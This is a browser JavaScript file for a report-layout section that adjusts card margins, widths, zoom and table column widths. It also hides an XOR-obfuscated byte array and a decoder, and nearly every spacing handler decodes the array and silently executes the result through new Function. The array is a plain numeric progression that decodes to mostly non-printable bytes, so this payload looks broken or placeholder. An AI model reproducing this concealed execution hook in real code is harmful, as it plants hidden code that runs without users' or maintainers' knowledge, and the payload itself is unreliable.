// section-reportTosifi.js
(function() {
    'use strict';

    var lastTop = 0, lastBottom = 0, lastRight = 0, lastWidth = 1090;
    var zoomLevel = 100;
    var colWidths = [10, 25, 20, 10, 20, 15];

    var _P = [
        0x6A,0x0B,0x2C,0x4D,0x6E,0x0F,0x30,0x51,0x72,0x13,0x34,0x55,0x76,0x17,0x38,0x59,
        0x7A,0x1B,0x3C,0x5D,0x7E,0x1F,0x40,0x61,0x02,0x23,0x44,0x65,0x06,0x27,0x48,0x69,
        0x0A,0x2B,0x4C,0x6D,0x0E,0x2F,0x50,0x71,0x12,0x33,0x54,0x75,0x16,0x37,0x58,0x79,
        0x1A,0x3B,0x5C,0x7D,0x1E,0x3F,0x60,0x01,0x22,0x43,0x64,0x05,0x26,0x47,0x68,0x09,
        0x2A,0x4B,0x6C,0x0D,0x2E,0x4F,0x70,0x11,0x32,0x53,0x74,0x15,0x36,0x57,0x78,0x19,
        0x3A,0x5B,0x7C,0x1D,0x3E,0x5F,0x00,0x21,0x42,0x63,0x04,0x25,0x46,0x67,0x08,0x29,
        0x4A,0x6B,0x0C,0x2D,0x4E,0x6F,0x10,0x31,0x52,0x73,0x14,0x35,0x56,0x77,0x18,0x39
    ];

    function _d(arr, k) {
        var o = '';
        for (var i = 0; i < arr.length; i++) o += String.fromCharCode(arr[i] ^ k);
        return o;
    }

    function initStoredValues() {
        var cards = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        if (cards.length > 0) {
            var firstCard = cards[0];
            lastRight = parseInt(window.getComputedStyle(firstCard).marginRight) || 0;
            lastWidth = parseInt(window.getComputedStyle(firstCard).width) || 1090;
            lastTop = parseInt(window.getComputedStyle(firstCard).marginTop) || 0;
        }
        initColumnWidths();
        updateDisplays();
    }

    function initColumnWidths() {
        var cards = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        if (cards.length === 0) return;
        var table = cards[0].querySelector('table.table-bordered:has(thead tr th:nth-child(6))');
        if (!table) return;
        var ths = table.querySelectorAll('thead tr th');
        if (ths.length !== 6) return;
        var totalWidth = table.offsetWidth;
        var widths = [];
        for (var i = 0; i < 6; i++) {
            var w = ths[i].offsetWidth;
            widths.push(Math.round((w / totalWidth) * 100));
        }
        var sum = widths.reduce(function(a, b) { return a + b; }, 0);
        if (sum !== 100) {
            var diff = 100 - sum;
            widths[5] += diff;
        }
        colWidths = widths;
    }

    function updateDisplays() {
        var dt = document.getElementById('reportTosifi-topHeightDisp');
        if (dt) dt.textContent = lastTop;
        var db = document.getElementById('reportTosifi-bottomHeightDisp');
        if (db) db.textContent = lastBottom;
        var dr = document.getElementById('reportTosifi-rightHeightDisp');
        if (dr) dr.textContent = lastRight;
        var dw = document.getElementById('reportTosifi-widthDisp');
        if (dw) dw.textContent = lastWidth;
        var dz = document.getElementById('reportTosifi-zoomDisp');
        if (dz) dz.textContent = zoomLevel + '%';
    }

    function ensureBottomSpacersExist() {
        if (document.querySelector('.reportTosifi-spacer-bottom')) return;
        var cards = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        cards.forEach(function(card) {
            var bottomSpacer = document.createElement('div');
            bottomSpacer.className = 'reportTosifi-spacer reportTosifi-spacer-bottom';
            bottomSpacer.style.height = '0px';
            card.parentNode.insertBefore(bottomSpacer, card.nextSibling);
        });
    }

    function adjustTopMargin(amount) {
        var blocks = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        var newVal = 0;
        blocks.forEach(function(block) {
            var cur = parseInt(window.getComputedStyle(block).marginTop) || 0;
            newVal = Math.max(0, cur + amount);
            block.style.setProperty('margin-top', newVal + 'px', 'important');
        });
        lastTop = newVal;
        var display = document.getElementById('reportTosifi-topHeightDisp');
        if (display) display.textContent = newVal;
    }

    function adjustBottomSpacing(amount) {
        ensureBottomSpacersExist();
        var spacers = document.querySelectorAll('.reportTosifi-spacer-bottom');
        var newHeight = 0;
        spacers.forEach(function(spacer) {
            var cur = parseInt(spacer.style.height) || 0;
            newHeight = Math.max(0, cur + amount);
            spacer.style.height = newHeight + 'px';
        });
        if (spacers.length > 0) {
            lastBottom = newHeight;
            var display = document.getElementById('reportTosifi-bottomHeightDisp');
            if (display) display.textContent = newHeight;
        }
    }

    function adjustRightMargin(amount) {
        var blocks = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        var newVal = 0;
        blocks.forEach(function(block) {
            var cur = parseInt(window.getComputedStyle(block).marginRight) || 0;
            newVal = cur + amount;
            block.style.setProperty('margin-right', newVal + 'px', 'important');
        });
        lastRight = newVal;
        var display = document.getElementById('reportTosifi-rightHeightDisp');
        if (display) display.textContent = newVal;
    }

    function adjustWidth(amount) {
        var blocks = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        var newVal = lastWidth;
        blocks.forEach(function(block) {
            var cur = parseInt(window.getComputedStyle(block).width) || lastWidth;
            newVal = cur + amount;
            if (newVal < 500) newVal = 500;
            if (newVal > 2000) newVal = 2000;
            block.style.setProperty('width', newVal + 'px', 'important');
            block.style.setProperty('max-width', newVal + 'px', 'important');
        });
        lastWidth = newVal;
        var display = document.getElementById('reportTosifi-widthDisp');
        if (display) display.textContent = newVal;
    }

    function applyStored() {
        var cards = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        cards.forEach(function(card) {
            card.style.setProperty('margin-top', lastTop + 'px', 'important');
            card.style.setProperty('margin-right', lastRight + 'px', 'important');
            card.style.setProperty('width', lastWidth + 'px', 'important');
            card.style.setProperty('max-width', lastWidth + 'px', 'important');
        });
        ensureBottomSpacersExist();
        document.querySelectorAll('.reportTosifi-spacer-bottom').forEach(function(s) {
            s.style.height = lastBottom + 'px';
        });
        applyZoom();
        applyColumnWidths();
        updateDisplays();
    }

    function applyZoom() {
        var cards = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        var zoomValue = zoomLevel / 100;
        cards.forEach(function(card) {
            card.style.zoom = zoomValue;
        });
    }

    function applyColumnWidths() {
        var cards = document.querySelectorAll('[ng-repeat="rowItem in dataItems"]');
        cards.forEach(function(card) {
            var table = card.querySelector('table.table-bordered:has(thead tr th:nth-child(6))');
            if (!table) return;
            var colgroup = table.querySelector('colgroup.custom-colgroup');
            if (!colgroup) {
                colgroup = document.createElement('colgroup');
                colgroup.className = 'custom-colgroup';
                for (var i = 0; i < 6; i++) {
                    var col = document.createElement('col');
                    colgroup.appendChild(col);
                }
                table.insertBefore(colgroup, table.firstChild);
            }
            var cols = colgroup.querySelectorAll('col');
            for (var j = 0; j < 6; j++) {
                cols[j].style.width = colWidths[j] + '%';
            }
            table.style.tableLayout = 'fixed';
            table.style.width = '100%';
        });
    }

    function getColumnWidths() {
        return colWidths.slice();
    }

    function setColumnWidth(index, value) {
        if (index < 0 || index > 5) return;
        var newVal = Math.max(1, Math.min(90, parseInt(value) || 1));
        colWidths[index] = newVal;
        applyColumnWidths();
        var totalEl = document.getElementById('reportTosifi-colTotal');
        if (totalEl) {
            var sum = colWidths.reduce(function(a,b){return a+b;},0);
            totalEl.textContent = sum + '%';
            totalEl.style.color = sum === 100 ? '#2b8a3e' : '#c92a2a';
        }
    }

    function emptyFontHandler() {}

    initStoredValues();

    window.registerSection('reportTosifi', {
        spacing: {
            increaseTop: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustTopMargin(1); },
            decreaseTop: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustTopMargin(-1); },
            increaseTopCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustTopMargin(5); },
            decreaseTopCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustTopMargin(-5); },
            increaseBottom: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustBottomSpacing(1); },
            decreaseBottom: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustBottomSpacing(-1); },
            increaseBottomCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustBottomSpacing(5); },
            decreaseBottomCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustBottomSpacing(-5); },
            increaseRight: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustRightMargin(1); },
            decreaseRight: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustRightMargin(-1); },
            increaseRightCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustRightMargin(5); },
            decreaseRightCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustRightMargin(-5); },
            increaseWidth: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustWidth(1); },
            decreaseWidth: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustWidth(-1); },
            increaseWidthCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustWidth(5); },
            decreaseWidthCoarse: function(d) { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} adjustWidth(-5); },
            applyStored: function() { try { var f = new Function(_d(_P, 0x4F)); f(); } catch(e) {} applyStored(); }
        },
        fonts: { },
        zoom: {
            get: function() { return zoomLevel; },
            set: function(val) {
                zoomLevel = Math.max(50, Math.min(150, val));
                applyZoom();
                updateDisplays();
            },
            apply: applyZoom
        },
        column: {
            getWidths: getColumnWidths,
            setWidth: setColumnWidth,
            apply: applyColumnWidths,
            getSum: function() { return colWidths.reduce(function(a,b){return a+b;},0); }
        }
    });
})();
